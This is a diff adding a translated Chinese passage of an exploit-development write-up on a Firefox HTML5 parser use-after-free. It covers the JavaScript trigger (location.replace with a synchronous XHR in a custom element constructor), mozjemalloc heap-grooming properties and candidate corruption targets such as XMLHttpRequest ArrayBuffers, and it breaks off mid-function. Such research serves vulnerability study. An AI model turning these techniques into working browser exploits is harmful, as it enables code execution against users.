@@ -1,0 +1,136 @@
+在错误的代码缺陷的上下文中，`nsHtml5TreeBuilder`由`nsHtml5StreamParser`实例化，而`nsHtml5StreamParser`又由`nsHtml5Parser`实例化。
+我们在自定义元素构造函数中使用了以下JavaScript代码：
+    location.replace("about:blank");
+我们告诉浏览器离开当前页面并在引擎中导致以下树结构：
+    Location::SetURI()
+    -> nsDocShell::LoadURI()
+       -> nsDocShell::InternalLoad()
+          -> nsDocShell::Stop()
+             -> nsDocumentViewer::Stop()
+                -> nsHTMLDocument::StopDocumentLoad()
+                   -> nsHtml5Parser::Terminate()
+                      -> nsHtml5StreamParser::Release()
+最后一个函数调用会删除`nsHtml5StreamParser`对象的引用，但它还没有完全独立出来：其余的引用将被几个异步任务删​​除，这些任务只会在下次`Gecko`的事件循环旋转时进行调度。
+这通常不会在运行`JavaScript`函数的过程中发生，因为JavaScript的一个属性是“永不阻塞”，但为了触发错误，我们必须在自定义元素构造函数返回之前执行这些挂起的异步任务。
+最后一个链接提供了如何完成此操作的方法：`“Legacy exceptions exist like alert or synchronous XHR”`。
+XHR（XMLHttpRequest）是一种可用于从Web服务器检索数据的API。
+可以使用同步XHR使浏览器引擎事件循环，直到XHR调用完成。也就是说，从Web服务器收到数据时我们即可调用此方法。
+因此，通过在自定义元素构造函数中使用以下代码...
+    location.replace("about:blank");
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/delay.txt', false);
+    xhr.send(null);
+...并设置联系的Web服务器，之后人为地将`/delay.txt`请求的响应延迟几秒钟以在浏览器中引起长时间的事件循环循环执行，我们可以保证在时间线5完成执行时，当前活动的`nsHtml5StreamParser`对象将独立出现。
+然后，下次发生垃圾收集循环时，将破坏孤立的`nsHtml5StreamParser`对象并解除其资源的分配（包括mHandles）。
+`“about:blank”`在新位置创建，因为它是一个空页面，所以不需要网络交互进行加载。
+此处的目的是确保引擎在`nsHtml5StreamParser`对象的销毁和写入损坏之间的范围内执行的工作量（代码逻辑）尽可能小，因为我们将利用`bug`将堆内存中的某些结构进行成功的改造。由于堆分配器本质上是非确定性的，因此在引擎中运行的任何额外逻辑同时也会意外的对开发过程产生破坏。
+### 释放内存的值是多少？
+`nsHtml5TreeOperation::CreateHTMLElement`的返回值是指向新创建的表示HTML元素的C ++对象的指针，例如，
+`HTMLTableElement`或`HTMLFormElement`。
+由于触发错误需要中止当前运行的文档解析器，因此该新对象不会链接到任何现有数据结构并保持孤立状态，并最终在将来的垃圾收集周期中释放。
+### 控制自由写入后的偏移量
+总结到目前为止，可以利用该bug来有效地发生以下伪代码：
+    nsIContent* mHandles[] = moz_xmalloc(0x1000);
+    nsIContent** target = &mHandles[mHandlesUsed++];
+    free(mHandles);
+    ...
+    *target = CreateHTMLElement(...);
+因此，虽然这里写入释放内存的值（`CreateHTMLElement()`的返回值）是不可控制的（总是一个内存分配指针）并且其内容不可靠，我们可以调整相对于该值写入的值的偏移量。
+根据`mHandlesUsed`的值，释放分配的基址。 正如我们之前展示的`mHandlesUsed`增加了解析器的HTML元素个数：
+    var f = document.createElement("iframe");
+    document.body.append(f);
+    f.srcdoc = `
+            console.log("this runs in the child iframe");
+            `;
+    console.log("this runs in the main page");
+### 背景 - Firefox堆的概念和属性
+要了解这里的利用过程，了解Firefox的内存分配器如何工作至关重要。
+Firefox使用一个名为`mozjemalloc`的内存分配器，它是`jemalloc`项目的一个分支。本节将简要介绍`mozjemalloc`的一些基本术语和属性。
+Regions:  
+"Regions"是用户分配返回的堆项目（例如malloc（3）调用）。”[PSJ]
+Chunks:  
+"Chunks"用于描述内存分配器在概念上将可用内存划分为的大虚拟内存区域。”[PSJ]
+Runs:  
+Runs是内存的进一步存储的大小，由`jemalloc`分成块。”[PSJ]
+“从本质上讲，一个chunk被分成几个部分。”[PSJ]
+“每次运行都包含特定大小的regions。”[PSJ]
+Size classes:  
+根据Size classes将分配分为几类。
+Firefox堆中的大小类：·4,8,16,32,48，...，480,496,512,1024,2048。[mozjemalloc.cpp]·  
+分配请求将四舍五入为最接近的大小类。
+Bins:  
+“每个bin都有一个关联的大小类，并存储/管理这个大小类的区域。”[PSJ]
+“bin的区域通过bin的运行进行管理和访问。”[PSJ]  
+伪码图：
+    void *x = malloc(513);
+    void *y = malloc(650);
+    void *z = malloc(1000);
+    // now: x, y, z were all allocated from the same bin,
+    // of size class 1024, the smallest size class that is
+    // larger than the requested size in
+LIFO free list:  
+`jemalloc`的另一个有趣特征是它以后进先出（LIFO）方式运行。 一个 free
+list后跟一个垃圾收集和一个相同大小的后续分配请求，很可能最终会在释放的区域内结束。“[TSOF]  
+伪码图：
+    void *x = moz_xmalloc(0x1000);
+    free(x);
+    void *y = moz_xmalloc(0x1000);
+    // now: x == y
+Same size class allocations are contiguous:
+我们在可以通过执行分配并耗尽空闲列表来实现的某种状态下，相同大小类的顺序分配将在内存中是连续的
+“分配请求（即`malloc()`调用）被四舍五入并分配给一个bin。 [...]如果此过程未找到，则分配新运行并将其分配给特定bin。
+因此，这意味着具有相似大小的不同类型对象在舍入到同一个bin中的对象在jemalloc堆中是连续的。“[TSOF]
+伪代码：
+    for (i = 0; i < 1000; i++) {
+            x[i] = moz_xmalloc(0x400);
+    }
+    // x[995] == 0x7fb8fd3a1c00
+    // x[996] == 0x7fb8fd3a2000 (== x[995] + 0x400)
+    // x[997] == 0x7fb8fd3a2400 (== x[996] + 0x400)
+    // x[998] == 0x7fb8fd3a2800 (== x[997] + 0x400)
+    // x[999] == 0x7fb8fd3a2c00 (== x[998] + 0x400)
+Run recycling:
+当运行中的所有分配都被释放时，运行将被取消分配并插入到可用运行列表中。 取消分配的运行可以与相邻的解除分配的运行合并，以创建更大的单个解除分配的运行。
+当需要新的运行时（用于保存新的内存分配），可以从可用运行列表中获取。
+这允许属于一个运行的存储器地址保持特定大小类的分配被“再循环”成为不同运行的一部分，保持不同大小类的分配。
+伪码图：
+    for (i = 0; i < 1000; i++) {
+            x[i] = moz_xmalloc(1024);
+    }
+    for (i = 0; i < 1000; i++) {
+            free(x[i]);
+    }
+    // after freeing all 1024 sized allocations, runs of 1024 size class
+    // have been de-allocated and put into the list of available runs
+    for (i = 0; i < 1000; i++) {
+            y[i] = moz_xmalloc(512);
+            // runs necessary for holding new 512 allocations, if necessary,
+            // will get taken from the list of available runs and get assigned
+            // to 512 size class bins
+    }
+    // some elements in y now have the same addresses as elements in x
+### 攻击手段
+考虑到这个错误会导致内存损坏，利用次方法尝试植入一个对象来代替释放的`mHandles`分配，以便用给定偏移量的内存地址指针覆。
+一个很好的方法是“`ArrayObjects inside
+ArrayObjects`”技术[TSOF]，我们将放置一个`ArrayObject`对象代替`mHandles`，然后用一个内存地址（这是一个非常大的数值）覆盖它的长度头变量这样就可以创建一个格式错误的`ArrayObject`对象，并且可以从JavaScript端访问，以便读取和写入比预期更多的内存，因为对该格式错误的数组的索引访问是根据已损坏的长度值进行验证的。
+但经过一些实验后，它似乎无法正常工作。原因是2017年10月推出的代码发生了变化，将JavaScript引擎的分配与其他分配分开。因此，`js_malloc()`（JavaScript引擎函数）和`moz_xmalloc()`（常规函数）的分配将不会在同一个堆上运行。这使得该技术大多已经过时。
+因此必须找到另一种对象类型。
+### XMLHttpRequestMainThread作为内存损坏的目标
+我们将再次讨论`XMLHttpRequest`，这次是从不同的角度。
+可以将XHR对象配置为以几种不同的方式接收响应，其中一种方式是通过`ArrayBuffer`对象：
+    var oReq = new XMLHttpRequest();
+    oReq.open("GET", "/myfile.png", true);
+    oReq.responseType = "arraybuffer";
+    oReq.onload = function (oEvent) {
+      var arrayBuffer = oReq.response;
+      if (arrayBuffer) {
+        var byteArray = new Uint8Array(arrayBuffer);
+        for (var i = 0; i < byteArray.byteLength; i++) {
+          // do something with each byte in the array
+        }
+      }
+    };
+    oReq.send(null);
+下面为引擎函数，它负责使用接收到的响应数据创建`ArrayBuffer`对象，在访问`XMLHttpRequest`的对象响应属性时调用（第6行）：
+    JSObject* ArrayBufferBuilder::getArrayBuffer(JSContext* aCx) {
+      if (mMapPtr) {
